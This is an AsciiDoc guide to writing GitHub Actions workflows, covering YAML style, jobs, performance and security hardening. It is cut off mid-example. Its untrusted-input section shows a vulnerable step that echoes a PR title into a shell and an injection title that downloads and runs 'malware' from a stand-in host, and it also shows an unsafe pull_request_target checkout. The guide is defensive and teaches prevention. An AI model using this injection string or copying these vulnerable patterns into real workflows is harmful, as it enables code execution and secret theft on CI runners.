== YAML syntax

////
TODO: Link to YAML best practices
////

Actions and workflows are defined in YAML files. YAML is designed to be a
human-readable, as well as a machine-parsable, data serialization format. YAML
files SHOULD, therefore, be written primarily with readability in mind.

Consideration SHOULD also be given to the maintenance of YAML files. Give
thought, for example, to how diffs will be presented in source control and
pull request systems. For example, because Git is a line-based version control
system, it is RECOMMENDED to use YAML's multi-line syntax for lists. So,
instead of this…

[source,yaml]
----
on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
----

… do this:

[source,yaml]
----
on:
  push:
    branches:
      - main
  pull_request:
    branches:
      - main
----

YAML comment syntax SHOULD be used to document anything that is not intuitively
understood from the YAML data structure and the workflow/action schema.

== Workflows and actions schema

=== General guidelines

* Prefer to compose workflows from modules. Encourage reuse by breaking out
  discrete parts of pipelines into actions or workflow templates.

* Break down workflows into smaller jobs and steps. This will make it easier to
  manage conditions and dependencies.

* Test workflows thoroughly. Ensure that conditional logic and job dependencies
  work as expected. Do this by testing all the possible scenarios that could
  trigger each workflow.

* Choose descriptive and meaningful names for your secrets and variables. It
  SHOULD NOT be necessary to consult any out-of-band documentation to understand
  the purpose of a secret or variable referenced in a workflow. If the meaning
  of a variable cannot be easily deduced from its name and context, include
  an adjacent comment to explain its purpose.

* Names for workflows, jobs and steps should also be clear and consistent.

=== Jobs

A single job may, for example, compile, test _and_ deploy an application. Though
convenient, it is generally considered to be best practice for each job
definition to be responsible for a single concern, and for complex workflows
to be composed from multiple single-responsibility jobs.

This has a number of advantages. For example, workflows will be easier to extend
and maintain, and logging output will be easier to analyze.

=== Steps

All steps SHOULD be given a unique name. This will help to identify the output
of each step in the logs, and make it easier to debug failed workflows.

[source,yaml]
----
steps:
  - name: Say hello
    run: echo "Hello, world!"
----

=== Expressions

Expressions are commonly used in `if` attributes to make execution of an
individual step or a whole job conditional.

[source,yaml]
----
jobs:
  production-deploy:
    if: github.repository == 'owner/repo' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-node@v2
        with:
          node-version: '14'
      - run: npm install -g bats
----

The value of the `if` attribute is treated as a JavaScript expression, rather
than a string value. Expressions can be used in other attributes, which assume
string values by default, using the `${{ <expression> }}` notation. Even in
`if` values, if the expression starts with `!`, the whole expression MUST be
encapsulated in the `${{ }}` syntax, or escaped with `''`, `""`, or `()`.
That's because the exclamation mark is reserved notation in YAML.

For consistency, it is RECOMMENDED the `${{ <expression> }}` syntax be used to
wrap all expressions, even those in `if` values where this syntax is not
required.

[source,yaml]
----
jobs:
  production-deploy:
    if: ${{ github.repository == 'owner/repo' && github.ref == 'refs/heads/main' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions/setup-node@v2
        with:
          node-version: '14'
      - run: npm install -g bats
----

== Performance

=== Minimalism

Keep individual workflows, and reusable actions, as minimal as possible. The
more time something takes to set up and run, the higher the costs of running
your CI/CD infrastructure. Even shaving a few seconds off the run of a
workflow can add up to significant cost savings over a month, a year.

Prefer lightweight actions over heavyweight ones. Prefer JavaScript actions
over container actions, and best of all are composite actions consisting of
simple shell scripts. Where container actions are essential – for example where
you require a specific programming language or toolchain – prefer to use light
images, such as alpine or alpine-node, over heavy ones.

Don't install unnecessary dependencies.

=== Caching

Be sure to use caching wherever possible. Have package managers cache
dependencies, and cache any generated artifacts that can be reused between
jobs or workflow runs.

=== Timeouts

By default, GitHub kills jobs after 6 hours if they have not finished by
then. Many jobs don't need nearly as much time to finish, but sometimes
jobs can hang and the extended run consumes unnecessary minutes, which has a
cost.

It is RECOMMENDED to specify shorter timeouts that are appropriate for each job.
This is specified in minutes via the `jobs.<job_id>.timeout-minutes` attribute.
Example:

[source,yaml]
----
jobs:
  set_config:
    timeout-minutes: 30
    runs-on: ubuntu-latest
    steps:
      - [...]
----

=== Concurrency

It is RECOMMENDED to implement a concurrency strategy for workflows, especially
long-running, resource-intensive ones. This will cancel running workflows in the
same group when an event triggers a new run of the same workflow. For example,
you can automatically cancel intermediate builds on a PR when a newer commit
gets pushed to the PR's source branch.

[source,yaml]
----
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ startsWith(github.ref, 'refs/pull/') }}
----

See the {link-docs-concurrency}[GitHub Docs] for further guidance.

== Security

See also {link-docs-security}[GitHub's Security Hardening for GitHub Actions]
guide, and also the series of posts on {link-docs-security-lab}[GitHub's
Security Lab] blog starting with "part 1: preventing pwn requests".

=== Secrets

Do not hard-code API keys, tokens, passwords, or other such secrets in workflow
files, even if those files are committed to private repositories. All sensitive
data MUST be managed via GitHub Secrets. GitHub Secrets provides a safe way to
store and use secrets in your workflows.

[TIP]
======
CI workflows are also a good place to implement secrets detection using tools
like https://github.com/GitGuardian/ggshield-action[GitGuardian].
======

Secrets SHOULD be regularly rotated, and unused ones deleted. Restrict who has
permissions to create and update secrets.

Do not use complex data types for storing secrets. Secrets SHOULD be
primitive values such as strings or numbers.

[source,txt]
----
# Good
SENSITIVE_VALUE1 = "abcdef"
SENSITIVE_VALUE2 = 123456

# Bad
{
  "sensitiveValue1": "abcdef",
  "sensitiveValue2": 123456
}
----

Be sure to mask any generated sensitive values in log output. Review the source
code of third party actions to make sure they do the same.

[source,yaml]
----
echo "::add-mask::$GENERATED_SENSITIVE_VALUE"
----

=== Tokens and long-lived secrets

Avoid storing tokens and other long-lived secrets where possible. For example,
rather than using API keys to authenticate with your infrastructure providers,
prefer using OpenID Connect (OIDC).

.How to use OpenID Connect
****
The following steps are done in your cloud provider:

1.  Create a role to be used only by your workflows. The role should contain the
    minimum set of permissions for the workflows to accomplish their tasks.

2.  Create an OIDC trust in the cloud provider. The trust should specify which
    repositories are allowed to obtain tokens, as well as any additional
    information necessary to increase security.

The following steps are done in the GitHub Actions workflows:

1.  Exchange GitHub's OIDC token for access credentials. There are several
    open source actions available from the marketplace that implement this
    exchange process.

2.  Use the short-lived credentials to manage resources. The short-lived
    credentials will be valid only for a single job, and will automatically
    expire after that.
****

DO NOT use classic Personal Access Tokens (PATS) to grant workflow access to
code from another repository. Ideally, create a GitHub App and use its
short-term credentials. If needed, use a fine-grained PAT and give it as few
permissions as necessary for the workflow to do its job (ie. only read access
to the required repositories).

When using fine-grained PATs, rotate then regularly. PATs are bound to specific
GitHub users, so it is RECOMMENDED to create a generic shared user account
against which to create your PATs.

=== Restricting permissions

By default, `GITHUB_TOKEN`, which is automatically generated on each run, is
given wide-ranging permissions to GitHub resources and operations. The principle
of least privilege should be applied to these tokens, which means restricting
permissions to the minimum required to do the job.

Permissions SHOULD be explicitly restricted on a per-workflow basis using
the `permissions` attribute.

[source,yaml]
----
name: Open new issue
on: workflow_dispatch

jobs:
  open-issue:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      issues: write
    steps:
      - run: |
          gh issue --repo ${{ github.repository }} \
            create --title "Issue title" --body "Issue body"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
----

See the GitHub Docs for a full {link-docs-permissions}[list of available
permissions].

[IMPORTANT]
======
DO NOT pass the workflow's `$GITHUB_TOKEN` to untrusted third-party software,
including custom actions from untrusted sources.
======

=== Minimal scope

To limit their scope, environment variables should be declared at the step
level wherever possible. Elevate them to the job or (rarely) the workflow
level only to solve the problem of sharing data between steps within a job,
and between jobs within a workflow.

=== Untrusted input

Don't directly reference values you don't control. Consider the following
example:

[source,yaml]
----
- name: lint
  run: |
    echo "${{github.event.pull_request.title}}" | commitlint
----

This allows for injection of malicious code into the workflow. For example,
raising a PR with the following title…

[source,txt]
----
a" && wget https://example.com/malware && ./malware && echo "Title
----

… would cause the following code to be executed in your runner:

[source,txt]
----
echo “a" && wget https://example.com/malware && ./malware && echo "Title” | commitlint
----

The following event context data cannot be trusted:

* `github.event.issue.title`
* `github.event.issue.body`
* `github.event.pull_request.title`
* `github.event.pull_request.body`
* `github.event.comment.body`
* `github.event.review.body`
* `github.event.pages.*.page_name`
* `github.event.commits.*.message`
* `github.event.head_commit.message`
* `github.event.head_commit.author.email`
* `github.event.head_commit.author.name`
* `github.event.commits.*.author.email`
* `github.event.commits.*.author.name`
* `github.event.pull_request.head.ref`
* `github.event.pull_request.head.label`
* `github.event.pull_request.head.repo.default_branch`
* `github.head_ref`

There are two possible solutions. The RECOMMENDED one is to create custom
actions with input arguments, rater than executing inline shell scripts:

[source,yaml]
----
uses: fakeaction/printtitle@v3
with:
  title: ${{ github.event.pull_request.title }}
----

Alternatively, bind the value to an intermediate environment variable:

[source,yaml]
----
- name: Print title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "$PR_TITLE"
----

[TIP]
======
It is best practice to double-quote shell variables to avoid word splitting.
This practice is relevant to shell scripting in general, and is not specific
to GitHub Actions.
======

It is RECOMMENDED to use code scanning tools to help detect potential exploits
in your workflow code.

=== Consuming open source actions

There are many open source GitHub Actions that can be plugged in to your own
workflows. However, just like with any open source software, open source actions
MUST be carefully audited before integrating them into your development
toolchain. The risks are similar to using package managers to automate the
integration of third party components into your applications.

The following steps are RECOMMENDED when using third-party actions:

* Use only actions that are actively maintained. Check that bugs are triaged
  and fixed, and that security vulnerabilities are patched – and quickly.

* Use only actions that are published to the GitHub Marketplace, and only actions
  that have been verified by GitHub.

* Review the action's `action.yml` file for inputs and outputs, and check that
  the code does what it says it does.

* Include a specific version of the action, which you have audited. Best practice
  is to specify a commit SHA, rather than a branch or version tag. This ensures
  that the action's code is locked down and cannot be changed without you
  explicitly updating the version referenced from your workflow configuration.
  This will help to protect you from unexpected supply-chain compromises in the
  future.

[source,yaml]
----
- name: Checkout code
  uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846
----

=== External PRs

For public repositories only, workflows MUST NOT check out code when the
workflow is triggered by a `pull_request_target` event. *This is very
dangerous.*

[source,yaml]
----
on: pull_request_target
#...
  - uses: actions/checkout@v3
    with:
      ref: ${{ github.event.pull_request.head.sha }}
----

Normally, workflow runs triggered from forks do not have access to secrets,
or write access to the repository, because the runs happen in the context of the
_base_ branch of the PR. However, the `pull_request_target` event is a special
case. GitHub introduced this event type at the request of the open source
community so that workflows could be run in the context of the _target_ branch
of a PR. But this has important security implications.

Using the `pull_request_target` events means the workflow will have access to
your secrets, and write access to your code. If the workflow is also checking out
and running code from the repository, that code can't be trusted because it has
come from the external contributor (via a fork of your repository). You're
opening up your workflow to remote code execution.

This security vulnerability is known as a "pwn request". It is a type of attack
where an attacker forks a public repository, creates a pull request to the
original repository, and then triggers a workflow run on the original repository
but which checks out and run the attacker's code from their forked repository.
The attacker can use their own code in the context of the original repository.
This can be used to extract secrets, modify _your_ repository's code, or even
take over your repository.

Therefore, whenever you use `pull_request_target` in a workflow, the workflow's
jobs MUST NOT check out, build, or run the repository's code. All code executed
in a `pull_request_target` workflow MUST be defined within the workflow
configuration itself.

There is more detail on this attack vector on {link-docs-security-lab}[GitHub's
Security Lab] blog.

For all other workflow triggers in public repositories, it is RECOMMENDED to
disable automatic workflow runs from forks. Workflows on pull requests to
public repositories from _first-time_ outside contributors will not run
automatically by default, but it is RECOMMENDED that you disable automatic
workflow runs from being triggered by external contributors _all of the time_.
Project maintainers MUST review code coming from external PRs before triggering
the CI to run on those changes. Workflow approval requirements can be configured
for a repository, organization, or at the enterprise level.

More generally, when adding workflows to public repositories, consider the
security implications by asking yourself the following questions:

* What events could trigger a run?
* What code will be executed in the runner? Can it be trusted?
* What inputs are given to the workflow? Can _that_ be trusted?
* What data, secrets, and services does that code access?

=== Self-hosted runners

Use self-hosted runners only for running workflows defined in private
repositories. Any code that `runs-on: self-hosted` runners MUST be kept private.

This is because, if in a public repository, third parties could run malicious
code on your self-hosted runners by forking the public repository and then
creating a pull request. The workflow would run in the context of the PR's base
branch, which is considered untrusted. The attacker could modify the workflow's
code, and this will be executed on your infrastructure (your self-hosted
runner).

If you are using self-hosted runners, you are fully responsible for hardening
your infrastructure to keep it secure from malicious use like this, for example
by:

* Configuring a dedicated low-privilege user.
* Using isolated and ephemeral workloads to execute the jobs.
* Implementing logging and monitoring to ensure visibility.

But the ultimate security is to make sure that your self-hosted runners can only
be used by trusted users inside your organization. That means keeping private
the workflows and actions that run on them.

[NOTE]
======
GitHub doesn't allow personal accounts to use self-hosted runners on public
repositories, but they do allow organizations to do so.
======

=== GitHub-hosted runners

It is recommended to pin workflows to specific runner versions, such as
`ubuntu-22.04` rather than `ubuntu-latest`. This means you must manually
update workflow configurations when old runner versions are deprecated,
but the tradeoff is your workflows will be more stable in the meantime.
(This is less an issue of security, more an issue of maintenance.)

[source,yaml]
----
# Prefer:
runs-on: ubuntu-22.04

# To:
